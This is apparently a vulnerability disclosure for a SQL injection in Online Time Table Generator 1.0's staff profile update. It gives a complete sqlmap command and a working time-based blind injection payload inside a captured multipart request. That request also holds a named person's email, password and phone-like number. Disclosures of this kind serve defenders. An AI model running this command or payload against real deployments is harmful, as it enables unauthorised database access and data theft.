# SQL Injection vulnerability from Project Worlds Online Time Table Generator 1.0 (/staffdashboard.php)

**Affected Project**: Online Time Table Generator 1.0

**Official Website**: https://projectworlds.in/online-time-table-generator-php-mysql/

**Version**: 1.0

**Related Code file**: staffdashboard.php

**Injection parameter**: `MULTIPART n`

## Vulnerability Description

When updating profile as the staff, **MULTIPART n** parameter is vulnerable to SQL injection vulnerability.

## Demonstration

staff can update profile as such:

![Screenshot from 2024-10-27 15-43-22](https://github.com/user-attachments/assets/27475c73-41a0-45eb-b46b-43ce5041bd40)

Intercept the traffic using Burp Suite:

![Screenshot from 2024-10-27 15-43-36](https://github.com/user-attachments/assets/56230041-c4de-4e59-982b-6df28835de05)

Now copy-paste the traffic and save it in to `update.req` and run `sqlmap` against it: `sqlmap -r update.req --batch --level 5 --risk 3 --dbms mysql`

`sqlmap` automatically exploits the vulnerability:

![Screenshot from 2024-10-27 15-46-14](https://github.com/user-attachments/assets/020e0ccb-ab9e-4e1f-b672-bf7cb2a61868)

```
---
Parameter: MULTIPART n ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ------WebKitFormBoundaryObNAzPyhmwmlBlmM
Content-Disposition: form-data; name="dep_id"

13
------WebKitFormBoundaryObNAzPyhmwmlBlmM
Content-Disposition: form-data; name="semester"

1
------WebKitFormBoundaryObNAzPyhmwmlBlmM
Content-Disposition: form-data; name="n"

Baijnath Kaushik' WHERE 9301=9301 AND (SELECT 4111 FROM (SELECT(SLEEP(5)))tNyi)-- Zhkv
------WebKitFormBoundaryObNAzPyhmwmlBlmM
Content-Disposition: form-data; name="e"

baijnath@smvdu.ac.in
------WebKitFormBoundaryObNAzPyhmwmlBlmM
Content-Disposition: form-data; name="p"

baijnath
------WebKitFormBoundaryObNAzPyhmwmlBlmM
Content-Disposition: form-data; name="m"

1234554321
------WebKitFormBoundaryObNAzPyhmwmlBlmM
Content-Disposition: form-data; name="a"

asdasdfaf
------WebKitFormBoundaryObNAzPyhmwmlBlmM
Content-Disposition: form-data; name="update"

Update Records
------WebKitFormBoundaryObNAzPyhmwmlBlmM--
```
